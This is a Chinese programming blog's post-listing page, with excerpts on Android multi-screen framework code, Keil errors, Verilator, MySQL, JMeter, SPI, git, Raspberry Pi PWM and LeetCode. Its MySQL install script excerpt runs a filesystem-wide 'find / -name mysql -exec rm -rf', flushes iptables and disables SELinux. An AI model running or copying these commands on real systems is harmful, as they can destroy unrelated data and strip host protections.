<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Posts - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Posts" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/posts/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/posts/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<header class="main__header">
		<h1 class="main__title">Posts</h1>
	</header><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cbbd8260c02f5dad0a5496e255e983a0/" rel="bookmark">
			第二节-安卓多屏双屏实战车载车机智能驾驶舱开发/千里马android framwork开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		hi,粉丝朋友们！
上一节已经对车载的多屏互动进行了相关的技术方案介绍，以及相关的核心方法
moveRootTaskToDisplay的讲解和使用。
具体可以参考链接：https://blog.csdn.net/learnframework/article/details/130461689
本节就来进行代码实战
1、方案设计 要实现双屏互动，主要就只需要两个步骤：
1、手指动作识别
2、识别动作后触发寻找display，获取顶部task，触发moveTask操作
2、手势动作识别部分 触发手势设计：因为模拟器实现条件有限，所以这里采用是双指向右移动一定距离触发。
首先要进行对手指全局移动的监听，针对多个手指的触摸移动动作要进行识别。
代码实现：
单独建立一个PointerEventListener的实现子类叫做DoubleScreenMovePointerEventListener，在这里面的onPointerEvent方法即可以实现对应的触摸动作识别，这里实现是双指同时滑动触摸方式：
diff --git a/services/core/java/com/android/server/wm/DoubleScreenMovePointerEventListener.java b/services/core/java/com/android/server/wm/DoubleScreenMovePointerEventListener.java new file mode 100644 index 000000000000..f9c765476d19 --- /dev/null +++ b/services/core/java/com/android/server/wm/DoubleScreenMovePointerEventListener.java @@ -0,0 +1,62 @@ +package com.android.server.wm; + +import android.view.MotionEvent; +import android.view.WindowManagerPolicyConstants; + +public class DoubleScreenMovePointerEventListener implements WindowManagerPolicyConstants.PointerEventListener { + boolean shouldBeginMove = false; + int mPoint0FirstX = 0; + int mPoint1FirstX = 0; + + int mPoint0LastX = 0; + int mPoint1LastX = 0; + int START_GAP = 20;//动作触发阈值，最少移动为20个像素才可以 + private final WindowManagerService mService; + + public DoubleScreenMovePointerEventListener(WindowManagerService mService, DisplayContent mDisplayContent) { + this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cbbd8260c02f5dad0a5496e255e983a0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fa9f3006151ad60336473c56e9361206/" rel="bookmark">
			Keil常见错误/警告 解释以及解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		waring: while loop has empty body（while为空的偱环体） 只是警告，语句没有错误，不消除也正常编译、运行；
把循环体下面一条语句，与while左对齐，可消除警告；
如果上一条方法不能解决，应该是两条语句前的空位是Tab或空格不统一，删除空位，统一用空格即可。
variable “xxxxxx“was declared but never referrnced 变量’XXXXX’定义但从未使用,或者是,虽然这个变量你使用了,但编译器认为变量XXXXX所在的语句没有意义,编译器把它优化了。
解决:看一下所定义的变量xxxx是否真实有用,如果变量xxxx的定义有意义并且进行了使用,那么可以尝试使用volatile修饰自己定义变量xxxx,若是真的没有用,那么删除掉或者注释掉以释放可能的内存。
Deprecated declaration xxxxxxxxxx - give arg types 在函数xxxxxxxxxx()声明和定义的时候定义参数类型，无参函数定义为void，即可解决该问题。
A1167E: Invalid line start 启动文件选择不对导致，如果采用的开发环境是keil ，那么应该选择arm文件夹下对应的启动文件。
L6304W: Duplicate input file .\system_apm32f10x_1.o ignored. 出现该问题的原因是 system_apm32f10x.c文件被重复包含了,去掉一个就好了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd6891718bd5540be87c46aac4b80f76/" rel="bookmark">
			Verilator入门（一）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 速度特性代码特性 1. 安装Verilator2. 上手Verilator2.1 模型转换2.2 构建测试文件2.3 构建仿真脚本 3. 波形查看4. 参考链接 Verilator可将硬件描述语言Verilog/SystemVerilog编译成优化后的支持多线程的高级语言C++/SystemC模型，通过在高级语言中例化硬件描述语言，进而使用高级语言的特性实现对Verilog/SystemVerilog的验证。简单来说，Verilator对Verilog/SystemVerilog等硬件描述语言添加了一个基于C++/SystemC的wrapper，而后借助C++和Verilator的特定库实现对Verilog/SystemVerilog的高效仿真。 Verilator 本质上是一个 Verilog/SystemVerilog 模拟器。它具有商业级、超快速、免费和开源等特性，但是它不能直接替代 Modelsim、 Questa Sim、 Synopsys VCS、 Vivado Xsim 和其他基于事件的模拟器。Verilator 是一个基于周期的模拟器，这意味着它不能在单个时钟周期内计算时间，也不能模拟精确的电路时序。因此，在Verilator中电路状态通常每个时钟周期评估一次，因此不能观察到任何周期内的小故障，并且不支持定时信号延迟。
速度特性 由于Verilator是基于周期的，因此它不能用于时序模拟、反向注释网表、异步（无时钟）逻辑，或者任何涉及时间概念的信号变化。无论何时评估电路，所有输出都会瞬间切换。
然而，由于时钟边缘之间的一切都被忽略了，Verilator 的模拟运行速度非常快（比SystemC模型快10倍左右，比Verilog仿真器快100倍左右，且支持多线程），在模拟具有一个或多个时钟的同步数字逻辑电路的功能，或从Verilog/SystemVerilog 代码中创建软件模型以用于软件开发方面非常有效。
代码特性 由于 verilator 是基于周期的，它不能完全支持 IEEE Verilog 和 SystemVerilog 标准（综合工具通常也不是完全兼容的)。Verilator 对提供的 Verilog/SystemVerilog 代码非常严格。除了不支持任何时间延迟，它也不会接受大多数不可综合的代码 ，因而不能简单地用Verilator来综合基于 SystemVerilog的 测试平台。
因为 Verilator 不支持不可综合的代码，所以与其他模拟器相比，它更接近于综合工具的行为，这带来了意想不到的好处。它将迫使用户编写更好的可综合代码，从而有可能减少在后续开发过程中可能会遇到的问题数量。
1. 安装Verilator 参考官方手册：
# Prerequisites: #sudo apt-get install git help2man perl python3 make autoconf g++ flex bison ccache #sudo apt-get install libgoogle-perftools-dev numactl perl-doc #sudo apt-get install libfl2 # Ubuntu only (ignore if gives error) #sudo apt-get install libfl-dev # Ubuntu only (ignore if gives error) #sudo apt-get install zlibc zlib1g zlib1g-dev # Ubuntu only (ignore if gives error) git clone https://github.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/dd6891718bd5540be87c46aac4b80f76/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e9325bfba6e06bf8b93d26eddc497bf5/" rel="bookmark">
			深入理解MySQL主从配置原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 1. MySQL主从复制原理工作原理 2. 主从配置步骤1: 配置主节点2: 备份主节点数据3: 配置从节点4: 启动主从复制 3.常见问题4. 需要考虑的一些因素 MySQL主从复制是一种数据库复制技术，通过将一个MySQL服务器（主节点）上的数据同步到其他MySQL服务器（从节点），实现数据的备份、读写分离、负载均衡等功能。主从复制在分布式系统和高可用性架构中起着重要作用。本文将详细介绍MySQL主从配置的原理和实践指南。
1. MySQL主从复制原理 主节点（Master）：主节点是数据的源头，负责处理写操作并将数据变更记录到二进制日志中。
从节点（Slave）：从节点通过读取主节点的二进制日志来复制主节点的数据。
二进制日志（Binary Log）：主节点将所有数据变更操作记录到二进制日志中，从节点通过读取二进制日志来复制数据。
复制线程（Replication Thread）：从节点中的复制线程负责读取主节点的二进制日志，并将数据变更应用到从节点的数据库中。
工作原理 主节点将数据变更操作记录到二进制日志中。
从节点连接到主节点，并请求从指定的位置开始复制数据。
主节点将二进制日志中的数据发送给从节点。
从节点的复制线程读取主节点的二进制日志，并将数据变更应用到从节点的数据库中。
从节点周期性地向主节点发送心跳信号，以检测主节点的状态。
如果主节点故障，从节点可以选举一个新的主节点，并继续复制数据。
2. 主从配置步骤 1: 配置主节点 在主节点的配置文件中，启用二进制日志功能，设置log_bin参数为ON，并指定二进制日志文件的位置。
为复制设置一个唯一的标识符，通过配置server_id参数来实现。
重启主节点使配置生效。
2: 备份主节点数据 在配置从节点之前，需要对主节点的数据进行备份，以便在从节点上进行初始化。
3: 配置从节点 在从节点的配置文件中，启用复制功能，设置replica-servers参数为ON。
配置从节点的唯一标识符，通过配置server_id参数来实现。
配置主节点的地址和端口，通过配置master_host和master_port参数来实现。
配置从节点的复制账户，通过配置replica_user和replica_password参数来实现。
重启从节点使配置生效。
4: 启动主从复制 在从节点上执行CHANGE MASTER TO语句，指定从节点要复制的主节点信息。
启动从节点的复制线程。
检查从节点的状态，确保主从复制已经建立。
3.常见问题 在MySQL主从复制中，可能会遇到一些常见问题和故障。以下是一些常见的问题和相应的排除方法：
主从延迟：如果从节点的复制线程滞后于主节点，可能会导致主从延迟。可以通过调整复制线程的参数和优化网络连接来解决延迟问题。
网络故障：如果主从节点之间的网络连接中断，复制会停止。可以通过检查网络连接和配置心跳机制来解决网络故障。
数据不一致：在某些情况下，主从节点之间可能会出现数据不一致的情况。可以通过检查日志和配置同步机制来解决数据不一致问题。
4. 需要考虑的一些因素 网络稳定性：主从节点之间的网络连接应该是稳定的，以确保复制过程的顺利进行。
数据一致性：在配置之前，应该确保主节点的数据是一致的，并进行备份以防止数据丢失。
监控和维护：定期监控主从节点的状态，并进行必要的维护和故障处理。
安全性：配置主从复制时，应该注意保护敏感信息，如访问凭证和网络连接。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4726e1e84471795dee52db1f10f5859/" rel="bookmark">
			Jmeter入门
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Jmeter入门 简单发送get post请求Jmeter各个元件的作用域和执行顺序Jmeter线程组属性mock模拟路径带参数的get接口Jmeter请求get接口mock模拟带form-data格式的post接口Jmeter请求带form-data格式参数的post接口mock模拟带json格式参数的post请求Jmeter请求json格式参数的post接口Jmeter实现全局（针对线程组）常量可灵活配置如何查看请求响应如何解决响应里中文乱码 逻辑控制器逻辑表达式 Jmeter连接Mysql数据库并执行sql引入jdbc jar添加JDBC connection configuration添加JDBC request查看sql查询结果SQL查询条件参数化SQL查询结果参数化 参数化CSV文件参数化函数生成参数用户定义的变量用户参数 关联 断言 聚合报告部署一个电商项目关联关联接口场景Json提取器正则表达式提取器Xpath提取器 断言JSON断言响应断言模式匹配规则持续时间断言 聚合报告 慕慕生鲜电商项目性能测试 简单发送get post请求 Jmeter各个元件的作用域和执行顺序 取样器只对自己其作用（大概就是这个意思）
逻辑控制器只对子节点里的逻辑控制器和取样器起作用
其他元件如果父节点不是取样器，对于所有姐妹节点起作用。如果父节点是取样器，那么只对父节点起作用
执行顺序：
配置元件 -&gt; 前置处理器 -&gt; 定时器-&gt;取样器 -&gt;后置处理器 -&gt;断言-&gt;监听器
Jmeter线程组属性 线程数：模拟的虚拟用户数，线程数为n,则线程组下的所有取样器请求会被发起n次
Ramp-up time（second): 顾名思义，几秒内模拟完所有虚拟用户，即发起线程组下的所有取样器请求
循环次数：
永远代表一直不停地执行测试计划，永远可以和调度器一起结合使用，如果调度器的启动延迟设为5秒，持续时间设为20秒，这就代表会延迟5s启动线程组下所有取样器请求，5s后开始发起请求，并且运行时间维持20s
除永远外，可以自定义循环次数，循环次数意味着线程组里取样器请求会被发起多少次
mock模拟路径带参数的get接口 java -jar ./moco-runner-1.1.0-standalone.jar http -p 18003 -c conf1.json
conf1.json 👇
[ { "description":"这是我们的第一个mock例子", "request":{ "uri":"/demo", "method": "get", "queries": { "name": "cxy", "age": "30" } }, "response": { "text":"Hello,Moco" } } ] 模拟接口http://ip:port/demo?
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c4726e1e84471795dee52db1f10f5859/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6862a264caaf2dddd4a091a2e79b87c5/" rel="bookmark">
			SPI协议详细总结附实例图文讲解通信过程（快速掌握）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 一、简介二、数据通信过程2.1 通信总过程总结2.2 具体协议规则2.2.1 时钟极性与时钟相位2.2.2 SPI模式2.2.3 图文实例讲解 2.3 SPI协议优缺点总结 三、其他相关链接1、Linux下spi网卡dm9051驱动移植及驱动调试分析总结[2、uboot下UCLASS框架详解---结合项目工作中spi master和flash驱动开发](https://blog.csdn.net/Luckiers/article/details/131298180) 一、简介 SPI(Serial Peripheral Interface，串行外设接口) 协议是一种高速高效率、全双工的通信总线，允许CPu与低速的外围设备之间进行同步串行数据的传输，主要是用同步的时钟信号对串行的数据同时进行发送和接收操作，从而实现全双工。常用于短距离通讯，主要是在嵌入式系统中。
SPI接口在芯片内部只占用四根线，主要有两条数据线、一根片选线和一根时钟信号线。这四根线分别对应SPI协议传输时的四种信号，分别有主机输出信号MOSI、从机输入信号MISO、片选信号sS n以及输出的时钟信号SCK。
SPI协议里定义了主模式和从模式两种工作方式，在协议里规定工作在主模式下的模块是主机，工作在从模式下的模块是从机。主机和从机之间按照SPI时序要求进行数据交换。
一个典型的SPI系统应包括只能有一个主机、一个或多个从机。
SPI接口只能有一个主机，但可以有一个或多个从机。下图显示了主机和从机之间的SPI连接。
名称解释SCLKSerial Clock (output from master); master输出至slave的通讯时钟MOSIMaster Output, Slave Input(output from master); 自master输出至slave的数据线MISOSOMI: Master Input, Slave Output(output from slave); 自slave输出至master的数据线SSSlave Select (active low, outputfrom master). master对slave的片选信号，自master输出至slave，低有效。 多个从机可与单个SPI主机一起使用。从机可以采用常规模式连接，或采用菊花链模式连接。
常规SPI模式
在常规模式下，主机需要为每个从机提供单独的片选信号。一旦主机使能(拉低)片选信号，MOSI/MISO线上的时钟和数据便可用于所选的从机。如果使能多个片选信号，则MISO线上的数据会被破坏，因为主机无法识别哪个从机正在传输数据。
菊花链模式：
在菊花链模式下，所有从机的片选信号连接在一起，数据从一个从机传播到下一个从机。在此配置中，所有从机同时接收同一SPI时钟。来自主机的数据直接送到第一个从机，该从机将数据提供给下一个从机 。
二、数据通信过程 2.1 通信总过程总结 SPI数据通信的流程可以分为以下四步：
1、主设备发起信号，将CS/SS拉低，选择片选，启动通信。
2、主设备通过发送时钟信号，来告诉从设备进行写数据或者读数据操作（采集时机可能是时钟信号的上升沿（从低到高）或下降沿（从高到低），根据spi模式而定），它将立即读取数据线上的信号，这样就得到了一位数据（1bit）。
3、主机（Master）将要发送的数据写到发送数据缓存区（Memory），缓存区经过移位寄存器（缓存长度不一定，看单片机配置），串行移位寄存器通过MOSI信号线将字节一位一位的移出去传送给从机，同时MISO接口接收到的数据经过移位寄存器一位一位的移到接收缓存区。
4、从机（Slave）也将自己的串行移位寄存器（缓存长度不一定，看单片机配置）中的内容通过MISO信号线返回给主机。同时通过MOSI信号线接收主机发送的数据，这样，两个移位寄存器中的内容就被交换。
当MASTER片选一个SLAVE时，每向SLAVE发送一个周期的SCLK信号，都会有1bit的数据从MOSI发送至slave，与此同时，slave每收到一个周期的SCLK信号，都会从MISO向master发送1bit的数据。这种全双工通讯，是由硬件保证的（MASTER与HOST中各有一个移位寄存器作为收发数据的缓存）。
2.2 具体协议规则 SPI总线上的数据传输由串行时钟SCK进行同步处理，串行时钟SCK由SPI主机产生，每个时钟周期仅发送1bit数据。，SPI有四种操作模式——SPI0、SPI1、SPI2和SPI3，它们的区别是定义了在时钟脉冲的哪条边沿转换（toggles）输出信号，哪条边沿采样输入信号，还有时钟脉冲的稳定电平值（就是时钟信号无效时是高还是低）。每种模式由一对参数刻画，它们称为时钟极性（clock polarity）CPOL与时钟相位（clock phase）CPHA。
2.2.1 时钟极性与时钟相位 CPOL表示SCK的空闲状态的有效电平；
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6862a264caaf2dddd4a091a2e79b87c5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fce969353bd71dae27067db3480f9042/" rel="bookmark">
			pinia-plugin-persistedstate适用于 Pinia 的持久化存储插件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装​ 用你喜欢的包管理器安装依赖：
pnpm:pnpm i pinia-plugin-persistedstate npm:npm i pinia-plugin-persistedstate yarn:yarn add pinia-plugin-persistedstate 将插件添加到 pinia 实例上
用法​ 创建 Store 时，将 persist 选项设置为 true。
使用选项式 Store 语法：
import { defineStore } from 'pinia' export const useStore = defineStore('main', { state: () =&gt; { return { someState: '你好 pinia', } }, persist: true, }) 或者使用组合式 Store 语法：
import { defineStore } from 'pinia' export const useStore = defineStore( 'main', () =&gt; { const someState = ref('你好 pinia') return { someState } }, { persist: true, } ) 现在，你的整个 Store 将使用默认持久化配置保存。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fce969353bd71dae27067db3480f9042/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6898c6cda674c1e78c4b52f809f95fc7/" rel="bookmark">
			Linux(Centos7.9)下mysql5.7/8 installation shell
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		#!/bin/bash #Author:小黑要上天 #Date:2023/6 #Description:mysql5.7/8 installation #Prerequisite:被安装服务器需要能联网 #功能菜单 function_menu() { clear echo -e "\033[44m功能菜单\033[0m" echo "1.安装mysql5.7" echo "2.安装mysql8" echo "3.退出" read -p "请输入对应功能菜单选项：" choice case $choice in 1) function_mysql57 ;; 2) function_mysql8 ;; 3) exit ;; *) echo "功能菜单选项错误，请重新输入" sleep 0.5 function_menu ;; esac } #环境变量初始化 function_environment() { # 清除系统原有的MySQL环境 rm -rf /var/run/yum.pid &amp;&amp; yum remove mysql* -y &amp;&amp; yum remove mariadb* -y find / -name mysql -exec rm -rf {} \; ## 删除原有的MySQL包 for i in `rpm -qa |grep mysql` do rpm -e --nodeps $i done # 设置系统环境 iptables -F setenforce 0 } #安装mysql5.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6898c6cda674c1e78c4b52f809f95fc7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23492b821ab9c8fbcbd81a449ac12ed1/" rel="bookmark">
			git 的基本使用 gitHub基本使用(个人学习记录)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先下载安装git
安装完git之后第一件事就是设置自己的用户名字和邮件 因为通过git 对项目进行管理的时候需要使用这些基本信息,记录是谁对项目进行了操作
git config --global user.name '用户名' git config --global user.email '用户邮箱' 使用 – global 的命令只需要运行一次就可以永久生效
查询自己的全局配置信息
用git 获取帮助信息
git status 获取文件当前状态
git status --short 或者 git status -s 精简方式显示文件状态
git commit -m ‘本次提交简短的描述信息(比如新建了一个管理文件)’
当对已经提交的文件进行修改后 该文件的此次修改还没有放到暂存区 查询状态会发现 红色M 表示内容被修改但没有被放到暂存区
git add 命令是个多功能命令
git add . 一次提交多个文件 一次性将新增和修改文件加入暂存区
git checkout – 文件名 撤销某文件修改 撤销比较危险 撤销后不可找回
git resetn HEAD 要移除的文件名 从暂存区中移除对应文件
跳过暂存区将文件直接加入到 git 仓库
git commit -a -m '描述消息' .
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23492b821ab9c8fbcbd81a449ac12ed1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3e05bff91aab921f1228cccb6a28ae64/" rel="bookmark">
			点亮你的创意，使用Python与树莓派制作呼吸灯的详细教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言PWM的介绍实现PWM控制LED亮度结果与分析 前言 在上一篇文章中，我们介绍了如何在树莓派上点亮一个LED灯，并让它以时间间隔为1秒进行闪烁。闪亮登场！在树莓派上点亮LED灯的简单详细方法_☞黑心萝卜三条杠☜的博客-CSDN博客。现在，我们将介绍如何制作一个呼吸灯。
PWM的介绍 PWM是脉冲宽度调制（Pulse Width Modulation）的缩写。与STM32一样，树莓派也可以通过PWM输出来控制电子元件，例如控制电机的速度和方向、LED的亮度等。
树莓派上的PWM输出通常是通过GPIO（General Purpose Input/Output）引脚来实现的。树莓派上有一些专门用于PWM输出的GPIO引脚，例如GPIO18、GPIO19等。在树莓派的Linux系统中，可以使用GPIO驱动程序和相关的库函数来控制PWM输出，以达到控制电子元件的目的。
树莓派的系统支持软件PWM和硬件PWM两种实现方式。软件PWM是通过程序来模拟PWM信号，实现较为简单且灵活，但精度相对较低。硬件PWM是由树莓派上的专用PWM控制器来实现的，具有精度高、稳定性好等特点，但需要使用专用的GPIO引脚，且控制复杂、功能较为有限。
实现PWM控制LED亮度 Python是一种十分流行的高级编程语言，也是许多树莓派项目中常用的编程语言之一。我们可以使用RPi.GPIO库来实现GPIO控制。
在其原理图上模拟连接LED其效果图为：
下面是以Python语言为基础，实现PWM信号输出的详细步骤：
设置树莓派引脚编码方式，并实例化一个PWM对象； # 设置编码方式 GPIO.setmode(GPIO.BCM) # 设置GPIO引脚 GPIO.setup(GPIO_Pin, GPIO.OUT) # 实例化PWM对象 pwmObject = GPIO.PWM(GPIO_Pin, frequency) 启动PWM； pwmObject.start(10) 使用函数ChangeDutyCycle()修改PWM的占空比，让LED灯呈现先逐渐点亮，再不断变暗的效果。 不需要使用PWM输出时，可调用函数stop()停止PWM输出； 下面是完整的源码：
def pwmControlLed(GPIO_Pin: int, frequency: int): """ 使用PWM控制LED呼吸灯 :param GPIO_Pin: 可控制的引脚 :param frequency: PWM的频率 :return: """ # 设置编码方式 GPIO.setmode(GPIO.BCM) # 设置GPIO引脚 GPIO.setup(GPIO_Pin, GPIO.OUT) # 实例化PWM对象 pwmObject = GPIO.PWM(GPIO_Pin, frequency) # 启动PWM pwmObject.start(0) try: while True: for dc in range(0, 101, 5): pwmObject.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3e05bff91aab921f1228cccb6a28ae64/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7648466205b84e3a9d1e0c3870255dfa/" rel="bookmark">
			macbook卸载软件时，显示软件已锁定解决办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		macbook卸载软件时，显示软件已锁定解决办法 1、点开启动台终端
2、输入
/bin/ls -dleo@ 你想要卸载的软件路径（可以直接从应用程序里面拖进来） 输完后点回车，你可以看到
drwxr-xr-x 3 root admin 99 12 23 13:33 你想要卸载的软件路径 3、输入
sudo /usr/bin/chflags -R noschg 你想要卸载的软件路径 4、然后输入密码，然后发现应用被解锁了，然后就可以按照常规方法删除啦
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a3caa69257a7deb842e8e7b9d8f7545/" rel="bookmark">
			多项式回归的原理及实现、多重回归的原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.多项式回归的原理及实现 笔记来源于《白话机器学习的数学》
1.1 多项式回归的原理 预测一个变量 x x x与一个变量 y y y的关系
例如：广告费 x x x与点击量 y y y
用曲线拟合数据
求导过程类比本人之前的博客进行推导，相关笔记：最小二乘法的原理及实现
n次曲线
f θ ( x ) = θ 0 + θ 1 x + θ 2 x 2 + ⋯ + θ n x n f_{\theta}(x)=\theta_0+\theta_1x+\theta_2x^2+\cdots+\theta_nx^n fθ​(x)=θ0​+θ1​x+θ2​x2+⋯+θn​xn
尽管次数越高对训练数据拟合越精确（过拟合）但我们的目的是用这个拟合曲线去预测训练数据之外的数据，需要这个曲线或模型具备泛化能力，而不是仅仅代表训练数据，过拟合使得模型不再具有代表性了，不能预测一般情形了
1.2 多项式回归的实现 广告费 x x x与点击量 y y y
import numpy as np import matplotlib.pyplot as plt # 读入训练数据 train = np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a3caa69257a7deb842e8e7b9d8f7545/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a0f461c92c40e4061691fb27b533e4e/" rel="bookmark">
			C&#43;&#43;mutable
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在 C++ 中，`mutable` 是一个关键字，用于修饰类的成员变量。`mutable` 关键字的作用是允许被修饰的成员变量在 `const` 成员函数中被修改，即使这些函数被声明为 `const`。
下面是 `mutable` 关键字的使用示例：
class MyClass { public: int getValue() const; private: mutable int counter; }; int MyClass::getValue() const { counter++; // 允许在 const 成员函数中修改 mutable 成员变量 return counter; } 在上述示例中，`counter` 是一个 `mutable` 成员变量。虽然 `getValue` 函数被声明为 `const`，即不会修改类的状态，但由于 `counter` 被标记为 `mutable`，因此在 `getValue` 函数内部可以对其进行修改。
使用 `mutable` 关键字的典型场景是当类的成员变量需要在某些情况下被修改，即使这些修改发生在 `const` 成员函数中。一种常见的应用是在类中使用缓存或记录对象状态的变量，而这些变量的更新操作并不会影响类的逻辑或状态。
需要注意的是，滥用 `mutable` 关键字可能会导致代码可读性和维护性的问题。因此，在使用 `mutable` 时，应谨慎考虑并确保其使用是必要的，并遵循良好的设计原则。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2fe27251bb434f6a1187ef022d30e991/" rel="bookmark">
			盛最多水的容器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。
找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。
返回容器可以储存的最大水量。
说明：你不能倾斜容器。
解法 class Solution: def maxArea(self, height: List[int]) -&gt; int: i, j, res = 0, len(height)-1, -1 while i &lt; j: if height[i] &lt; height[j]: res = max(res, height[i] * (j-i)) i += 1 else: res = max(res, height[j] * (j-i)) j -= 1 return res 说明 双指针
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/409b5080121d07df4d309316bcf5ce43/" rel="bookmark">
			插入区间(leetcode)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源 leetcode 57 题目说明 给你一个 无重叠的 ，按照区间起始端点排序的区间列表。
在列表中插入一个新的区间，你需要确保列表中的区间仍然有序且不重叠（如果有必要的话，可以合并区间）。
解决 class Solution: def insert(self, intervals: List[List[int]], newInterval: List[int]) -&gt; List[List[int]]: left, right = newInterval placed = False ans = list() for li, ri in intervals: if li &gt; right: # 在插入区间的右侧且无交集 if not placed: ans.append([left, right]) placed = True ans.append([li, ri]) elif ri &lt; left: # 在插入区间的左侧且无交集 ans.append([li, ri]) else: # 与插入区间有交集，计算它们的并集 left = min(left, li) right = max(right, ri) if not placed: ans.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/409b5080121d07df4d309316bcf5ce43/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8f638e7ab446cf11fe2ee36b9797bd0/" rel="bookmark">
			PLSQL详细连接Oracle
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PLSQL连接Oracle 安装PLSQL Oracle11g详细安装_怡雪～的博客-CSDN博客
上篇详细讲解了如何安装Oracle,本篇详细讲解PLSQL连接Oracle
下载文件：
链接：百度网盘 请输入提取码
提取码：1023 (我和女朋友在一起的日子嘿嘿嘿)
下载文件夹后，解压选择的zip文件
解压发现有32位和64位的，根据自己的电脑选择安装，我的是64位，选的第二个双击打开
选择next
选择i accept,接着next
选择默认路径，接着next
继续next
选择install
选择finish
安装客户端client 解压选择的zip文件
打开client文件夹，双击setup.exe
选择是
选择管理员
选择下一步
安装位置，可以自己选，建议默认，但记住路径，后面配置会用到
直接点完成，跳过概要，开始安装，中间跳的提示都允许
等待安装
中间弹出的防火墙选择允许即可
选择关闭，完成安装
配置oracle客户端连接服务器端 在oracle数据库的安装目录里这个路径下
C:\app\chang\product\11.2.0\dbhome_1\NETWORK\ADMIN
把listener.ora和tnsnames.ora两个文件复制到安装的客户端路径下
C:\app\chang\product\11.2.0\client_1\network\admin
配置系统环境变量 添加以下3个变量：
ORACLE_HOME：填oracle数据库的安装路径，
TNS_ADMIN ：填客户端里tnsnames.ora文件所在路径
NLS_LANG ：SIMPLIFIED CHINESE_CHINA.ZHS16GBK
